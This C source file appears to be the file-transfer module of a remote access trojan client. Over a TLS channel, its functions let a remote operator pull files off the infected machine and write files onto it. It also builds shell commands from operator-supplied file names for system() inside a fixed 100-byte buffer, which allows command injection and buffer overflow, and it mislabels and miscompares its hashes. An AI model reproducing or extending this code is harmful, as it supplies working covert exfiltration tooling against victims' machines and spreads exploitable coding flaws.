#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>

#include "mbedtls/ssl.h"
#include "mbedtls/net.h"
#include "mbedtls/sha256.h"
#include "mbedtls/base64.h"

#include "rat_client.h"

void upload_file(struct compression* compress, mbedtls_ssl_context ssl)
{
    FILE* local_file = NULL;
    char *first_file_original = NULL, *put_file = NULL;
    unsigned int remain_data = 0, i = 0;
    struct stat st;
    int fd = 0;
    size_t file_size = 0, sent_bytes = 0, total_sent = 0;
    mbedtls_sha256_context file_hash;
    unsigned char sha1_output[32];
    unsigned char sha1_check[32];

    put_file = (char*)compress->orig_buffer;
    strsep(&put_file, " ");
    first_file_original = strsep(&put_file, " ");
    printf("File upload: %s\n", first_file_original);

    if (access(first_file_original, F_OK) == -1){
        printf("File not found\n");
        return;
    }

    if (access(first_file_original, R_OK) == -1) {
        printf("Access denied\n");
        return;
    }

    char first_file[] = "/tmp/dummyXXXXXX";
    mktemp(first_file);

    // encode file in base64 before transmission
    char command[100];
    memset(command, 0, 100);
    strncat(command, "base64 ", 8);
    strncat(command, first_file_original, strlen(first_file_original));
    strncat(command, " > ", 4);
    strncat(command, first_file, strlen(first_file));

    system(command);

    local_file = fopen(first_file, "rb");
    if (local_file == NULL) {
        perror("error opening file");
        return;
    }

    fd = fileno(local_file);
    if (fd == -1) {
        perror("Unable to get fileno");
    }

    //Get local file size
    memset(&st, 0, sizeof(struct stat));
    if (stat(first_file, &st) == -1) {
        perror("stat error");
    }

    //Get the file size
    file_size = st.st_size;
    printf("File size %zd bytes\n", file_size);

    //Send file size for the other side to receive
    if ( mbedtls_ssl_write(&ssl, (unsigned char*)&file_size, sizeof(file_size)) == -1 ) {
        printf("Error: %s", strerror(errno));
        return;
    }

    remain_data = file_size;
    sent_bytes = 0;
    total_sent = 0;

    //Initialize for SHA256 hash
    mbedtls_sha256_init(&file_hash);
    mbedtls_sha256_starts(&file_hash, 0);

    memset(compress->orig_buffer, 0, BUFFER_SIZE);
    memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    compress->orig_size = 0;
    compress->transformed_size = 0;
    // Sending file data
    while ((compress->orig_size = fread(compress->orig_buffer, 1, BUFFER_SIZE, local_file)) > 0) {
        #ifdef DEBUG
        printf("Read: %d\n", compress->orig_size);
        #endif
        mbedtls_sha256_update(&file_hash, compress->orig_buffer, compress->orig_size);
        compress_buffer(compress);
        sent_bytes += mbedtls_ssl_write(&ssl, compress->transformed_buffer, compress->transformed_size);
        #ifdef DEBUG
        fprintf(stdout, "Sent %zu bytes from file's data, remaining data = %d\n", sent_bytes, remain_data);
        #else
        fprintf(stdout, ".");
        #endif
        total_sent += compress->orig_size;
        remain_data -= compress->orig_size;
        memset(compress->orig_buffer, 0, BUFFER_SIZE);
        memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    }

    if (total_sent < file_size) {
        fprintf(stderr, "\nincomplete transfer from sendfile: %zu of %zu bytes\n", total_sent, file_size);
    } else {
        printf("\nFinished transferring %s\n", first_file_original);
    }
    printf("Compressed: %f%%\n", ((sent_bytes / (double)total_sent)*100));

    mbedtls_sha256_finish(&file_hash, sha1_output);
    printf("\nSHA1 hash: ");
    for (i = 0; i < sizeof(sha1_output); i++) {
        printf("%02x", sha1_output[i]);
    }
    printf("\n");

    if (mbedtls_ssl_read(&ssl, sha1_check, sizeof(sha1_check)) < 0) {
        printf("Error recving Sha1 hash\n");
    }

    if (strncmp((const char*)sha1_output, (const char*)sha1_check, sizeof(sha1_output)) == 0) {
        printf("SHA1 hashes matches\n");
    } else {
        printf("SHA1 hashes don't match\n");
    }

    mbedtls_sha256_free(&file_hash);
    fclose(local_file);

    memset(command, 0, 100);
    strncat(command, "rm -f ", 7);
    strncat(command, first_file, strlen(first_file));
    system(command);

    return;
}

void download_file(struct compression* compress, mbedtls_ssl_context ssl)
{
    char* command = (char*)malloc(BUFFER_SIZE);
    int offset = 0;
    size_t file_size = 0, size_recv = 0 ;
    FILE* local_file = NULL;
    char *first_file = NULL, *second_file_original = NULL, *command_start = NULL;
    unsigned int remain_data = 0, i = 0;
    unsigned char sha1_output[32];
    unsigned char sha1_check[32];
    mbedtls_sha256_context file_hash;

    command_start = strncpy(command, (char*)compress->orig_buffer, BUFFER_SIZE);
    if (strsep(&command, " ") == NULL){
        perror("Error parsing download");
    }
    first_file = strsep(&command, " ");
    second_file_original = strsep(&command, " ");
    printf("File download: %s -> %s\n", first_file, second_file_original);

    if (second_file_original == NULL){
        printf("Second file is null\n");
        second_file_original = first_file;
    }

    char second_file[] = "/tmp/tempXXXXXX";
    mktemp(second_file);

    local_file = fopen(second_file, "wb");
    if (local_file == NULL) {
        fprintf(stderr, "Failed to open file foo --> %s\n", strerror(errno));
        exit(-1);
    }

    file_size = 0;
    size_recv = 0;
    if ((size_recv = mbedtls_ssl_read(&ssl, (unsigned char*) &file_size, sizeof(size_t))) > 0) {
        if (size_recv == (unsigned int)-1) {
            perror("Error recving");
        }
    }
    printf("File size %zd\n", file_size);

    if (file_size == 0){
        memset(compress->orig_buffer, 0, BUFFER_SIZE);
        memset(compress->transformed_buffer, 0, BUFFER_SIZE);
        compress->orig_size = mbedtls_ssl_read(&ssl, compress->orig_buffer, BUFFER_SIZE);
        decompress_buffer(compress);
        printf("File download error: %s\n", compress->transformed_buffer);
        free(command_start);
        fclose(local_file);
        return;
    }

    //Initialize SHA1 hash
    mbedtls_sha256_init(&file_hash);
    mbedtls_sha256_starts(&file_hash, 0);

    remain_data = 0;
    offset = 0;
    memset(compress->orig_buffer, 0, BUFFER_SIZE);
    memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    while (((compress->orig_size = mbedtls_ssl_read(&ssl, compress->orig_buffer, BUFFER_SIZE)) > 0) || (remain_data < file_size)) {
        decompress_buffer(compress);
        mbedtls_sha256_update(&file_hash, compress->transformed_buffer, compress->transformed_size);
        offset = fwrite(compress->transformed_buffer, 1, compress->transformed_size, local_file);
        remain_data += offset;
        #ifdef DEBUG
        fprintf(stdout, "Received %d bytes out of %d bytes\n", remain_data, (int)file_size);
        #else
        fprintf(stdout, ".");
        #endif
        memset(compress->transformed_buffer, 0, BUFFER_SIZE);
        memset(compress->orig_buffer, 0, BUFFER_SIZE);
        if (remain_data == file_size) {
            break;
        }
    }
    printf("\nFinished writing file %s\n", second_file_original);

    //Hash check
    mbedtls_sha256_finish(&file_hash, sha1_output);
    printf("\nSHA1 hash: ");
    for (i = 0; i < sizeof(sha1_output); i++) {
        printf("%02x", sha1_output[i]);
    }
    printf("\n");

    if (mbedtls_ssl_read(&ssl, sha1_check, sizeof(sha1_check)) < 0) {
        printf("Error recving Sha1 hash\n");
    }

    if (strncmp((const char*)sha1_output, (const char*)sha1_check, sizeof(sha1_output)) == 0) {
        printf("SHA1 hashes matches\n");
    } else {
        printf("SHA1 hashes don't match\n");
    }

    printf("Changing permissions to 644\n");
    if (chmod(second_file, S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH) == -1) {
        printf("Unable to chmod\n");
    }

    fclose(local_file);

    // decode file now
    char decode_command[100];
    memset(decode_command, 0, 100);
    strncat(decode_command, "base64 --decode ", 17);
    strncat(decode_command, second_file, strlen(second_file));
    strncat(decode_command, " > ", 4);
    strncat(decode_command, second_file_original, strlen(second_file_original));

    system(decode_command);

    memset(decode_command, 0, 100);
    strncat(decode_command, "rm -f ", 7);
    strncat(decode_command, second_file, strlen(second_file));
    system(decode_command);

    free(command_start);

    return;
}
